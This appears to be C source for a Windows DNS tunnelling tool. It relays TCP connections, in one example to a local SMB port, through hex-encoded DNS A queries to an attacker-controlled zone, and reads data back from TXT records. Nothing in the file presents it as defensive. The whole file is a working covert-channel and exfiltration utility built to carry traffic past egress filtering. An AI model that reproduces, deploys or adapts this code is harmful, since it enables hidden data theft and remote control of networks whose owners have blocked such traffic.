#include <winsock2.h> //winsock
#include <windns.h> //DNS api's
#include <stdio.h> //standard i/o

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "dnsapi.lib")

#define BUF_SIZE 1024
#define MAX_CON 10
#define TIMEOUT 100
#define DNS_SIZE 50

/*
cl /c dns_tcp.c
link /out:dns_tcp.exe dns_tcp.obj ws2_32.lib dnsapi.lib
*/

char *zone;
int new_connection = 1;
int timeout;
int dns_size;

int unhexa(char major, char minor)
{
	int byte;
	byte = (int)major - 0x30;
	if((int)major > 0x60)
		byte -= 0x27;
	byte <<= 4;
	byte += (int)minor - 0x30;
	if((int)minor > 0x60)
		byte -= 0x27;
	return byte;
}

void dns_send(char *buf, int buf_size, int socket)
{
	DNS_STATUS error;
    PDNS_RECORD pDnsRecord;
    DNS_FREE_TYPE freetype;
    int i, j, pos = 0;
    char *dns = malloc(1000);
    int bytes = 0;

    if(buf_size == 0)
    {
    	memset(dns, '\x00', 1000);
    	sprintf(dns, "s%d.%d.00.%d.%s", bytes, buf_size, socket, zone);
    	DnsQuery(dns, DNS_TYPE_A, DNS_QUERY_BYPASS_CACHE, (PIP4_ARRAY)0, &pDnsRecord, 0);
    }
    while(pos < buf_size)
	{
		j = 0;
		memset(dns, '\x00', 1000);
		j += sprintf(dns, "%d.s%d.%d.", rand(), bytes, buf_size);
		for(i = 0; (i < dns_size && pos < buf_size); i++, pos++)
			j += sprintf(dns+j, "%02x", (unsigned char)buf[pos]);
		j += sprintf(dns+j, ".%d", socket);
		sprintf(dns+j, ".%s", zone);
		printf("[+] -> %s\n", dns);
		while(1)
		{
			error = DnsQuery(dns, DNS_TYPE_A, DNS_QUERY_BYPASS_CACHE, (PIP4_ARRAY)0, &pDnsRecord, 0);
			if(error)
			{
				printf("[!] dns send error: %d\n", error);
				Sleep(1000);
			}
			else
				break;
		}
        pDnsRecord->Data.A.IpAddress;
        DnsRecordListFree(pDnsRecord, freetype);
		Sleep(timeout);
		bytes += dns_size;
	}
    free(dns);
}

int dns_recv(char *buf, int buf_size, int socket)
{
	DNS_STATUS error;
    PDNS_RECORD pDnsRecord;
    char pReversedIP[255];
    char DnsServIp[255];
    DNS_FREE_TYPE freetype;
    freetype = DnsFreeRecordListDeep;

    char *dns = malloc(100);
    int pos = 0;
    int size;
    int i;
    while(pos < buf_size)
    {
    	memset(dns, '\x00', 100);
    	sprintf(dns, "%d.r%d.%d.%s", rand(), pos, socket, zone);

    	while(1)
    	{
    		error = DnsQuery(dns, DNS_TYPE_TEXT, DNS_QUERY_BYPASS_CACHE, (PIP4_ARRAY)0, &pDnsRecord, 0);
    		if(error)
    		{
    			printf("[!] dns recv error: %d\n", error);
    			Sleep(1000);
    		}
    		else
    			break;
    	}

    	if(pDnsRecord->Data.TXT.pStringArray[0][0] == '-')
    	{
    		DnsRecordListFree(pDnsRecord, freetype);
    		free(dns);
    		return -1;
    	}
    	else
        	size = strlen(pDnsRecord->Data.TXT.pStringArray[0]);

        if(size == 0)
        {
        	printf("[*] <- %s\n", dns);
        	break;
        }
        else
        	printf("[+] <- %s %s\n", dns, pDnsRecord->Data.TXT.pStringArray[0]);

        for(i = 0; i < size; i+=2)
        	buf[pos++] = unhexa(pDnsRecord->Data.TXT.pStringArray[0][i], pDnsRecord->Data.TXT.pStringArray[0][i+1]);
        DnsRecordListFree(pDnsRecord, freetype);
        Sleep(timeout);
    }
    free(dns);
    return pos;
}

void _send(int * socket)
{
	char buf[BUF_SIZE];
	int recv_bytes;
	while(1)
	{
		if(! *socket)
			break;
		recv_bytes = recv(*socket, buf, BUF_SIZE, 0);
		if(recv_bytes <= 0)
		{
			printf("[*] connection closed on tcp_recv()\n");
//			new_connection = 1;
			break;
		}
		dns_send(buf, recv_bytes, *socket);
	}
	dns_send("", 0, *socket);
	closesocket(*socket);
	*socket = 0;
}

void _recv(int * socket)
{
	char buf[BUF_SIZE];
	int buf_size;
	int is_new = 1;
	srand(time(0));
	while(1)
	{
		if(! *socket)
			break;
		buf_size = dns_recv(&buf, BUF_SIZE, *socket);
		if(buf_size == -1)
		{
			printf("[*] connection %d closed on dns_recv()\n", *socket);
//			new_connection = 1;
			break;
		}
		if(buf_size)
		{
			if(!send(*socket, buf, buf_size, 0))
			{
				printf("[*] connection closed on tcp_send()\n");
//				new_connection = 1;
				break;
			}
			if(is_new)
			{
//				new_connection = 1;
				is_new = 0;
			}
		}
		Sleep(timeout);
	}
}

void die(char * mes)
{
	printf("%s: %d\n", mes, WSAGetLastError());
	ExitProcess(-1);
}

void dns_connect(char *ip, int port)
{
	char buf[BUF_SIZE];
	WSADATA wsa_data;
	SOCKET c;
	struct sockaddr_in sock_addr;
	int recv_bytes;
	int threads_id[2];
	int *c_ptr;

	if( WSAStartup( MAKEWORD(2, 2), &wsa_data ) )
		die("WSAStartup() error");

	sock_addr.sin_family = AF_INET;
	sock_addr.sin_addr.s_addr = inet_addr(ip);
	sock_addr.sin_port = htons(port);

	while(1)
	{
		if(new_connection)
		{
			c = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
			if( c == INVALID_SOCKET )
				die("socket() error");
			if( connect( c, (struct sockaddr *) &sock_addr, sizeof(sock_addr) ) )
				printf("connect() error\n");
			else
			{
				printf("connected\n");
				c_ptr = malloc(sizeof(c));
				*c_ptr = c;
				CreateThread(0, 0, (LPTHREAD_START_ROUTINE)_send, c_ptr, 0, &threads_id[0]);
				CreateThread(0, 0, (LPTHREAD_START_ROUTINE)_recv, c_ptr, 0, &threads_id[1]);
				new_connection = 0;
			}
		}
		Sleep(timeout);
	}
	closesocket(c);
	WSACleanup();
}

void dns_listen(int port)
{
	WSADATA wsa_data;
	SOCKET s,c;
	struct sockaddr_in sock_addr;
	int recv_bytes = 0;
	int threads_id[2];
	int *c_ptr;

	if( WSAStartup( MAKEWORD(2, 2), &wsa_data ) )
		die("WSAStartup() error");

	sock_addr.sin_family = AF_INET;
	sock_addr.sin_addr.s_addr = inet_addr("0.0.0.0");
	sock_addr.sin_port = htons(port);

	s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if( s == INVALID_SOCKET )
		die("socket() error");

	if( bind( s, (struct sockaddr *) &sock_addr, sizeof(sock_addr) ) )
		die("bind() error");

	if( listen(s, MAX_CON) )
		die("listen() error");

	while(1)
	{
		c = accept(s, 0, 0);
		if(c == INVALID_SOCKET)
			die("accept() error");
		printf("incoming connect\n");
		c_ptr = malloc(sizeof(c));
		*c_ptr = c;
		CreateThread(0, 0, (LPTHREAD_START_ROUTINE)_send, c_ptr, 0, &threads_id[0]);
		CreateThread(0, 0, (LPTHREAD_START_ROUTINE)_recv, c_ptr, 0, &threads_id[1]);
	}
	closesocket(s);
	WSACleanup();
}

void main(int argc, char **argv)
{
	char mode;
	char *ip;
	int port;

	zone = getenv("ZONE");
	timeout = getenv("TIMEOUT") ? atoi(getenv("TIMEOUT")) : TIMEOUT;
	dns_size = (getenv("DNS_SIZE") ? atoi(getenv("DNS_SIZE")) : DNS_SIZE)/2;
	mode = argv[1][0];
	switch(mode)
	{
		case 'c':
			ip = argv[2];
			port = atoi(argv[3]);
			dns_connect(ip, port);
			break;
		case 'l':
			port = atoi(argv[2]);
			dns_listen(port);
			break;
		default:
			return;
	}
}

/*
	dns_tcp.exe l 8888
	dns_tcp.exe c 127.0.0.1 445
*/
